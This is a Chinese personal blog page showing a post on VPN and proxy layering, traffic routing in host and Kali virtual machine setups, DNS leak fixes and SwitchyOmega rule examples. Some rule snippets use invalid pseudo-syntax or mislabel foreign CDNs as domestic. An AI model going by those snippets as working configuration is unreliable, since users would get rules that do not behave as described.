<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/zhuzhuxia-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/zhuzhuxia-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zq-rookie-hacker.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":"18px","offset":0},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"placeholder":"搜索文章...","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="ZQ-Rookie-Hacker&#39;s Blog">
<meta property="og:url" content="https://zq-rookie-hacker.github.io/page/2/">
<meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZQ-Rooie-Hacker">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zq-rookie-hacker.github.io/page/2/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZQ-Rookie-Hacker's Blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
  <script src="/js/third-party/tags/mermaid.js" defer></script>





  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZQ-Rookie-Hacker's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZQ-Rooie-Hacker"
      src="/images/zhuzhuxia.jpg">
  <p class="site-author-name" itemprop="name">ZQ-Rooie-Hacker</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">17</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/ZQ-Rookie-Hacker" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZQ-Rookie-Hacker" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rooie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">VPN代理与流量流向分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-11-13 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-13T12:00:00+08:00">2025-11-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-11-25 21:56:20" itemprop="dateModified" datetime="2025-11-25T21:56:20+08:00">2025-11-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">基础知识</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.8k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>6 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="一、代理层级架构与优先级原理"><a href="#一、代理层级架构与优先级原理" class="headerlink" title="一、代理层级架构与优先级原理"></a>一、代理层级架构与优先级原理</h2><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_1.png" class="" title="在这里插入图片描述">




<h3 id="1-网络层代理（VPN）-最底层"><a href="#1-网络层代理（VPN）-最底层" class="headerlink" title="1. 网络层代理（VPN）- 最底层"></a>1.<code> 网络层代理</code>（VPN）- 最底层</h3><ul>
<li><strong>工作层级</strong>：操作系统内核层</li>
<li><strong>技术代表</strong>：OpenVPN、WireGuard、IPsec</li>
<li><strong>控制粒度</strong>：<strong>全局代理</strong> - 所有应用程序流量</li>
<li><strong>技术比喻</strong>：给电脑<strong>虚拟搬迁</strong>到VPN服务器机房</li>
<li><strong>特点</strong>：透明性高、安全性强，但灵活性差</li>
</ul>
<h3 id="2-系统层代理-中间层"><a href="#2-系统层代理-中间层" class="headerlink" title="2. 系统层代理 - 中间层"></a>2. <code>系统层代理 </code>- 中间层</h3><ul>
<li><strong>工作层级</strong>：操作系统应用层协议</li>
<li><strong>技术代表</strong>：Windows&#x2F;MacOS系统代理设置</li>
<li><strong>控制粒度</strong>：<strong>系统级</strong> - 影响遵守系统设置的应用程序</li>
<li><strong>技术比喻</strong>：设立<strong>总的收发室</strong>处理外寄信件</li>
<li><strong>特点</strong>：配置方便，但容易被应用程序绕过</li>
</ul>
<h3 id="3-应用层代理-最高层"><a href="#3-应用层代理-最高层" class="headerlink" title="3. 应用层代理 - 最高层"></a>3. <code>应用层代理</code> - 最高层</h3><ul>
<li><p><strong>浏览器插件</strong>（SwitchyOmega等）：</p>
<ul>
<li><strong>控制粒度</strong>：<strong>进程级</strong> - 仅控制浏览器流量</li>
<li><strong>技术比喻</strong>：书房内的<strong>智能路由器</strong></li>
<li><strong>存在意义</strong>：提供最精细的流量控制，实现国内外网站分流</li>
</ul>
</li>
<li><p><strong>应用程序内置代理</strong>：</p>
<ul>
<li><strong>控制粒度</strong>：<strong>应用级</strong> - 仅影响单个应用程序</li>
<li><strong>特点</strong>：配置独立，针对性强的网络通道</li>
</ul>
</li>
</ul>
<hr>
<h2 id="二、四大核心场景流量走向详解"><a href="#二、四大核心场景流量走向详解" class="headerlink" title="二、四大核心场景流量走向详解"></a>二、四大核心场景流量走向详解</h2><h3 id="场景1：主机标准VPN模式（无冲突）"><a href="#场景1：主机标准VPN模式（无冲突）" class="headerlink" title="场景1：主机标准VPN模式（无冲突）"></a>场景1：主机标准VPN模式（无冲突）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_2.png" class="" title="在这里插入图片描述">



<p><strong>核心逻辑</strong>：最标准的VPN使用场景。所有应用程序流量都遵循系统级代理设置，通过VPN隧道加密转发，实现全局网络匿名化。</p>
<p><strong>适用场景</strong>：需要完全匿名、安全加密所有流量的环境。</p>
<h3 id="场景2：主机浏览器代理分流（主动绕行）"><a href="#场景2：主机浏览器代理分流（主动绕行）" class="headerlink" title="场景2：主机浏览器代理分流（主动绕行）"></a>场景2：主机浏览器代理分流（主动绕行）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_3.png" class="" title="在这里插入图片描述">


<p><strong>核心逻辑</strong>：浏览器插件优先级高于系统代理，实现<strong>精细化流量分流</strong>。浏览器按插件规则转发（国内外网站分流），其他应用仍走VPN通道。</p>
<p><strong>存在意义</strong>：解决VPN”一刀切”的弊端，优化访问速度，避免国内流量绕行。</p>
<h3 id="场景3：虚拟机理想共享模式（透明代理）"><a href="#场景3：虚拟机理想共享模式（透明代理）" class="headerlink" title="场景3：虚拟机理想共享模式（透明代理）"></a>场景3：虚拟机理想共享模式（透明代理）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_4.png" class="" title="在这里插入图片描述">


<p><strong>核心逻辑</strong>：虚拟机通过NAT模式完全依赖主机网络路由，继承主机VPN设置，实现”透明代理”效果。</p>
<p><strong>前提条件</strong>：</p>
<ul>
<li>虚拟机设为<strong>NAT模式</strong></li>
<li>关闭虚拟机内所有代理插件</li>
<li>主机运行全局VPN</li>
</ul>
<h3 id="场景4：虚拟机代理冲突（嵌套绕行）"><a href="#场景4：虚拟机代理冲突（嵌套绕行）" class="headerlink" title="场景4：虚拟机代理冲突（嵌套绕行）"></a>场景4：虚拟机代理冲突（嵌套绕行）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_5.png" class="" title="在这里插入图片描述">


<p><strong>核心逻辑</strong>：虚拟机内浏览器插件拦截流量，导致浏览器绕开主机VPN，形成<strong>代理嵌套冲突</strong>。</p>
<p><strong>问题根源</strong>：虚拟机内的高优先级代理规则覆盖了主机的低优先级代理规则。</p>
<hr>
<h2 id="三、Kali-虚拟机配置"><a href="#三、Kali-虚拟机配置" class="headerlink" title="三、Kali 虚拟机配置"></a>三、Kali 虚拟机配置</h2><h3 id="完整配置检查清单"><a href="#完整配置检查清单" class="headerlink" title="完整配置检查清单"></a>完整配置检查清单</h3><p>为确保Kali虚拟机正确共享主机VPN，请按以下流程系统配置：</p>
<img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_6.png" class="" title="在这里插入图片描述">


<h3 id="关键配置步骤"><a href="#关键配置步骤" class="headerlink" title="关键配置步骤"></a>关键配置步骤</h3><h4 id="1-基础环境配置"><a href="#1-基础环境配置" class="headerlink" title="1. 基础环境配置"></a>1. 基础环境配置</h4><ul>
<li><strong>主机VPN</strong>：必须使用系统级全局VPN（OpenVPN、WireGuard等）</li>
<li><strong>网络模式</strong>：虚拟机设置为<strong>NAT模式</strong>（默认）</li>
</ul>
<h4 id="2-DNS泄漏解决方案"><a href="#2-DNS泄漏解决方案" class="headerlink" title="2. DNS泄漏解决方案"></a>2. DNS泄漏解决方案</h4><p><strong>临时方案（测试用）</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/resolv.conf</span><br><span class="line"><span class="comment"># 添加：nameserver 10.8.0.1 （替换为实际VPN DNS）</span></span><br><span class="line"><span class="built_in">sudo</span> chattr +i /etc/resolv.conf  <span class="comment"># 锁定文件</span></span><br></pre></td></tr></table></figure>

<p><strong>永久方案（推荐）</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">disable</span> systemd-resolved</span><br><span class="line"><span class="built_in">sudo</span> systemctl stop systemd-resolved</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /etc/resolv.conf</span><br><span class="line"><span class="built_in">sudo</span> nano /etc/resolv.conf  <span class="comment"># 配置VPN DNS</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="四、验证与故障排除"><a href="#四、验证与故障排除" class="headerlink" title="四、验证与故障排除"></a>四、验证与故障排除</h2><h3 id="基础验证方法"><a href="#基础验证方法" class="headerlink" title="基础验证方法"></a>基础验证方法</h3><ol>
<li><p><strong>IP地址检测</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line"><span class="comment"># 访问：WhatIsMyIPAddress.com</span></span><br></pre></td></tr></table></figure>
<p><strong>预期</strong>：显示IP应与VPN服务器位置一致</p>
</li>
<li><p><strong>DNS泄漏测试</strong>：</p>
<ul>
<li>访问 <a target="_blank" rel="noopener" href="https://www.dnsleaktest.com/">DNS Leak Test</a></li>
<li>执行 <strong>Extended Test</strong><br><strong>预期</strong>：不应出现本地ISP的DNS服务器</li>
</ul>
</li>
</ol>
<h3 id="故障排除-checklist"><a href="#故障排除-checklist" class="headerlink" title="故障排除 checklist"></a>故障排除 checklist</h3><ul>
<li>✅ 主机VPN是否正常连接</li>
<li>✅ 虚拟机是否为NAT模式  </li>
<li>✅ 虚拟机浏览器代理插件是否关闭</li>
<li>✅ DNS是否配置正确且无泄漏</li>
<li>✅ 系统时间是否同步（影响HTTPS）</li>
</ul>
<h2 id="五、知识总结"><a href="#五、知识总结" class="headerlink" title="五、知识总结"></a>五、知识总结</h2><h3 id="代理选择策略"><a href="#代理选择策略" class="headerlink" title="代理选择策略"></a>代理选择策略</h3><table>
<thead>
<tr>
<th>需求场景</th>
<th>推荐代理方式</th>
<th>理由</th>
</tr>
</thead>
<tbody><tr>
<td>全局匿名安全</td>
<td><strong>网络层VPN</strong></td>
<td>所有流量加密，完全匿名</td>
</tr>
<tr>
<td>网页浏览优化</td>
<td><strong>浏览器插件</strong></td>
<td>国内外分流，速度最优</td>
</tr>
<tr>
<td>办公环境统一</td>
<td><strong>系统代理</strong></td>
<td>统一管理，配置简便</td>
</tr>
<tr>
<td>虚拟机共享</td>
<td><strong>NAT模式+VPN</strong></td>
<td>透明代理，无需复杂配置</td>
</tr>
</tbody></table>
<h3 id="关键原则"><a href="#关键原则" class="headerlink" title="关键原则"></a>关键原则</h3><ol>
<li><strong>理解代理层级</strong>：浏览器插件 &gt; 系统代理 &gt; VPN</li>
<li><strong>虚拟机前提</strong>：NAT模式是共享主机VPN的基础</li>
<li><strong>DNS安全</strong>：DNS泄漏是最大的安全隐患</li>
<li><strong>按需配置</strong>：根据实际需求选择合适的代理层级</li>
</ol>
<hr>
<h2 id="六、浏览器插件使用"><a href="#六、浏览器插件使用" class="headerlink" title="六、浏览器插件使用"></a>六、浏览器插件使用</h2><h3 id="方法一：SwitchyOmega-系统VPN联动（推荐）"><a href="#方法一：SwitchyOmega-系统VPN联动（推荐）" class="headerlink" title="方法一：SwitchyOmega + 系统VPN联动（推荐）"></a>方法一：SwitchyOmega + 系统VPN联动（推荐）</h3><ul>
<li><p>基础环境准备</p>
<ul>
<li><strong>系统VPN</strong>：连接你的全局VPN（OpenVPN、WireGuard等）</li>
<li><strong>SwitchyOmega</strong>：在浏览器中安装并配置</li>
</ul>
</li>
<li><p>SwitchyOmega配置步骤： 创建两个情景模式：</p>
<ul>
<li><p><strong>直连模式</strong>（Direct）<br>- 类型：直接连接<br>- 用于访问国内网站</p>
</li>
<li><p><strong>VPN模式</strong>（System VPN）<br>- 类型：直接连接（是的，直接连接！）<br>- 因为系统VPN已经在全局工作，这里选择直接连接就会走系统VPN</p>
</li>
</ul>
</li>
</ul>
<p><strong>配置自动切换模式（Auto Switch）：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在自动切换的规则列表中配置</span></span><br><span class="line"><span class="comment">// 国内网站直连，国外网站走系统VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直连规则（国内网站）</span></span><br><span class="line">||baidu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||taobao.<span class="property">com</span>^ → <span class="title class_">Direct</span>  </span><br><span class="line">||qq.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||weibo.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||zhihu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||alipay.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||jd.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||<span class="number">163.</span>com^ → <span class="title class_">Direct</span></span><br><span class="line">||sina.<span class="property">com</span>.<span class="property">cn</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||sohu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用系统VPN（国外网站）</span></span><br><span class="line">||google.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||youtube.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||facebook.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||twitter.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||github.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||wikipedia.<span class="property">org</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认规则：直连（保守策略）</span></span><br><span class="line">* → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<p>使用更智能的方案：使用规则列表</p>
<p><strong>导入现成的规则列表：</strong></p>
<ol>
<li>在Auto Switch模式中点击”从文件恢复”</li>
<li>导入以下规则列表之一：<ul>
<li><strong>GFWList</strong>：最全面的被墙网站列表</li>
<li><strong>ChinaList</strong>：中国国内网站列表</li>
</ul>
</li>
</ol>
<p><strong>或者使用在线规则列表：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</span><br></pre></td></tr></table></figure>

<p>配置完成后，流量走向如下：</p>
<img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_7.png" class="" title="在这里插入图片描述">


<h3 id="方法二：纯SwitchyOmega代理方案（替代方案）"><a href="#方法二：纯SwitchyOmega代理方案（替代方案）" class="headerlink" title="方法二：纯SwitchyOmega代理方案（替代方案）"></a>方法二：纯SwitchyOmega代理方案（替代方案）</h3><p>如果系统VPN不稳定，可以在SwitchyOmega中直接配置代理：</p>
<p>配置代理服务器情景模式：</p>
<ul>
<li><strong>名称</strong>：My VPN</li>
<li><strong>协议</strong>：SOCKS5 或 HTTP</li>
<li><strong>服务器</strong>：你的VPN服务器地址</li>
<li><strong>端口</strong>：对应的代理端口</li>
</ul>
<p> 自动切换规则</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 国内CDN和常用服务直连</span></span><br><span class="line">||cn^ → <span class="title class_">Direct</span></span><br><span class="line">||taobao.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||baidu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 国外网站走代理</span></span><br><span class="line">||google.<span class="property">com</span>^ → <span class="title class_">My</span> <span class="variable constant_">VPN</span></span><br><span class="line">||youtube.<span class="property">com</span>^ → <span class="title class_">My</span> <span class="variable constant_">VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认直连</span></span><br><span class="line">* → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<h3 id="方法三：进阶优化配置"><a href="#方法三：进阶优化配置" class="headerlink" title="方法三：进阶优化配置"></a>方法三：进阶优化配置</h3><ol>
<li>性能优化规则</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 图片、视频直连（加速加载）</span></span><br><span class="line">||jpg|png|gif|mp4|webm^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 国内CDN直连</span></span><br><span class="line">||cloudflare.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||akamai.<span class="property">net</span>^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 银行支付网站直连（安全）</span></span><br><span class="line">||alipay.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||unionpay.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||icbc.<span class="property">com</span>.<span class="property">cn</span>^ → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>条件规则</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据网络环境自动调整</span></span><br><span class="line"><span class="comment">// 如果在国内网络，启用分流</span></span><br><span class="line"><span class="comment">// 如果在国外网络，全部直连</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 本地网络直连</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> → <span class="title class_">Direct</span></span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span> → <span class="title class_">Direct</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<h2 id="验证配置效果"><a href="#验证配置效果" class="headerlink" title="验证配置效果"></a>验证配置效果</h2><ol>
<li>测试国内网站</li>
</ol>
